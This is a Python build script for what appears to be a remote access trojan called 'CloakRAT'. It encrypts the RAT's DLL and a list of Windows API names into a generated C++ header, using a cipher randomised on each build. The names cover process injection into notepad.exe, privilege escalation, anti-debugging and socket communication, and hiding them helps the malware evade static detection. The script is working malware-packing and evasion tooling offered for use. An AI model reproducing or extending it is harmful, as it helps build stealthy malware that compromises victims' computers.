import secrets
import os

HEADER_NAME = 'encrypted_strings_autogen.h'
CURR_DIR = os.path.dirname(os.path.realpath(__file__))
HEADER_DIR = CURR_DIR + '\\Shared'  # Assuming that encrypt_strings.py is in the root dir of the solution
KEY_ENTROPY = 16  # bytes
HEADER_XOR_KEY_VARIABLE_NAME = 'BUILD_TIME_KEY'
HEADER_XOR_CIPHER_VARIABLE_NAME = 'BUILD_TIME_CIPHER_BYTE'


# Add or modify strings here.
strings_to_encrypt = {
    # General strings
    'str_ip': '127.0.0.1',
    'str_cmd': 'cmd.exe /C',
    'str_dllPath': f'{CURR_DIR}\\x64\\Release\\CloakRAT.dll',
    'str_procName': 'notepad.exe',
    
    # Function names
    'str_NtSetInformationThread': 'NtSetInformationThread',
    'str_GetCurrentThread': 'GetCurrentThread',
    'str_Sleep': 'Sleep',
    'str_OpenProcess': 'OpenProcess',
    'str_VirtualAllocEx': 'VirtualAllocEx',
    'str_WriteProcessMemory': 'WriteProcessMemory',
    'str_LoadLibraryA': 'LoadLibraryA',
    'str_CreateRemoteThread': 'CreateRemoteThread',
    'str_CloseHandle': 'CloseHandle',
    'str_LookupPrivilegeValueA': 'LookupPrivilegeValueA',
    'str_GetLastError': 'GetLastError',
    'str_AdjustTokenPrivileges': 'AdjustTokenPrivileges',
    'str_OpenProcessToken': 'OpenProcessToken',
    'str_GetCurrentProcess': 'GetCurrentProcess',
    'str_CreateToolhelp32Snapshot': 'CreateToolhelp32Snapshot',
    'str_Process32First': 'Process32First',
    'str_Process32Next': 'Process32Next',
    'str_CreatePipe': 'CreatePipe',
    'str_SetHandleInformation': 'SetHandleInformation',
    'str_ReadFile': 'ReadFile',
    'str_CreatePipe': 'CreatePipe',
    'str_FormatMessageA': 'FormatMessageA',
    'str_LocalFree': 'LocalFree',
    'str_CreateProcessA': 'CreateProcessA',
    'str_IsDebuggerPresent': 'IsDebuggerPresent',
    'str_GetModuleHandleW': 'GetModuleHandleW',
    'str_VirtualProtect': 'VirtualProtect',
    'str_HeapSetInformation': 'HeapSetInformation',
    'str_FindWindowW': 'FindWindowW',
    'str_GetProcessHeap': 'GetProcessHeap',
    'str_GetComputerNameW': 'GetComputerNameW',
    'str_OpenThread': 'OpenThread',
    'str_GetEnvironmentVariableW': 'GetEnvironmentVariableW',
    'str_GetThreadContext': 'GetThreadContext',
    'str_IsWow64Process': 'IsWow64Process',
    'str_GetWindowLongPtrW': 'GetWindowLongPtrW',
    'str_GetWindowRect': 'GetWindowRect',
    'str_WSAStartup': 'WSAStartup',
    'str_htons': 'htons',
    'str_inet_pton': 'inet_pton',
    'str_connect': 'connect',
    'str_htonl': 'htonl',
    'str_send': 'send',
    'str_socket': 'socket',
    'str_recv': 'recv',
    'str_ntohl': 'ntohl',
    'str_closesocket': 'closesocket',
    'str_WSACleanup': 'WSACleanup',
    
    # DLLs
    'str_kernel32': 'kernel32.dll',
    'str_ntdll': 'ntdll.dll',
    'str_advapi32': 'advapi32.dll',
    'str_ws2_32': 'ws2_32.dll',
    'str_user32': 'user32.dll',
    
    # Debug
    'str_WSAGetLastError': 'WSAGetLastError',
}

def gen_key() -> list[int]:
        key = []
        for _ in range(KEY_ENTROPY):
            key.append(secrets.randbelow(256))
        return key

def get_random_op() -> str:
    return secrets.choice(['+', '-', '*'])

def xor_encrypt(plain_bytes: bytes, key: list[int], cipher: str) -> list[int]:
    # The highest bit in the first byte is preserved to indicate if runtime re-encryption has happened (see runtime_reencryption() in string_encryption.cpp)
    encrypted_bytes = [secrets.randbelow(128)] # highest possible random value is 2^7

    for i, byte in enumerate(plain_bytes, 1):
        encrypted_bytes.append((byte ^ eval(cipher)) & 0xFF)
    
    return encrypted_bytes
    
def to_c_struct(variable_name: str):
    # return in the format: static EncryptedBytes var_name = { var_name, sizeof(var_name) };
    return f'static EncryptedBytes {variable_name} = {{\n    {variable_name}_data,\n    sizeof({variable_name}_data)\n}};'

def to_c_array(variable_name: str, buffer: list[int]) -> str:
    # return in the format: "static unsigned char variable_name_DATA[] = { ...buffer };"
    elems = ', '.join(str(b) for b in buffer)
    return f"static uint8_t {variable_name}_data[] = {{ {elems} }};"
    

def main():    
    key = gen_key()

    rand_op1 = get_random_op()
    rand_op2 = get_random_op()
    rand_op3 = get_random_op()
    rand_xor_value = secrets.randbelow(256)
    
    # BE CAREFUL TO EDIT VARIABLE NAMES HERE, THIS IS GOING TO BE PROCESSED BY eval() - I WILL PROBABLY CHANGE IT SOMETIME CUZ IT'S BAD
    byte_chiper = f"((i % 4 | ((i {rand_op1} 9) {rand_op2} 2 + key[i % len(key)] & ((i//2)>>3) * i {rand_op3} key[i % len(key)]) << (i % 5)) & 0x7F ^ {rand_xor_value})" # randomize the cipher each run
    
    # Generate the Header file
    with open(f'{HEADER_DIR}\\{HEADER_NAME}', 'w') as header_file:
        c_style_byte_cipher = f"(uint8_t)((i % 4 | ((i {rand_op1} 9) {rand_op2} 2 + {HEADER_XOR_KEY_VARIABLE_NAME}[i % {HEADER_XOR_KEY_VARIABLE_NAME}.size()] & ((i/2)>>3) * i {rand_op3} {HEADER_XOR_KEY_VARIABLE_NAME}[i % {HEADER_XOR_KEY_VARIABLE_NAME}.size()]) << (i % 5)) & 0x7F ^ {rand_xor_value})"
        
        header_file.write('#pragma once\n\n')
        header_file.write('#include <array>\n\n')
        header_file.write(f'#define {HEADER_XOR_CIPHER_VARIABLE_NAME} {c_style_byte_cipher}\n')
        header_file.write(f'static std::array<uint8_t, {KEY_ENTROPY}> {HEADER_XOR_KEY_VARIABLE_NAME} = {{ {', '.join(str(b) for b in key)} }};\n\n')
        header_file.write(f'typedef struct EncryptedBytes {{\n    uint8_t* data;\n    size_t length;\n}} EncryptedBytes;\n\n')
        
        # Encrypt strings
        for var_name, string in strings_to_encrypt.items():
            encrypted_string_lst = xor_encrypt(string.encode(), key, byte_chiper)
            encrypted_c_arr = to_c_array(var_name, encrypted_string_lst)
            c_struct = to_c_struct(var_name)
            
            header_file.write(f'// "{string}"\n')  # Add the plaintext string as a comment for clarity
            header_file.write(encrypted_c_arr + '\n')  # Example: static unsigned char str_kernel32_data[] = { ... };
            header_file.write(c_struct + '\n\n')  # Example: static EncryptedBytes str_kernel32 = { str_kernel32_data, sizeof(str_kernel32_data) };
            
        # Encrypt the RAT dll
        with open(f'{CURR_DIR}\\x64\\Release\\CloakRAT.dll', 'rb') as rat_dll:
            dll_bytes = rat_dll.read()
            variable_name = 'rat_dll'
            encrypted_c_dll_arr = to_c_array(variable_name, xor_encrypt(dll_bytes, key, byte_chiper))
            
            header_file.write(encrypted_c_dll_arr + '\n')
            header_file.write(to_c_struct(variable_name) + '\n\n')

            

if __name__ == '__main__':
        main()
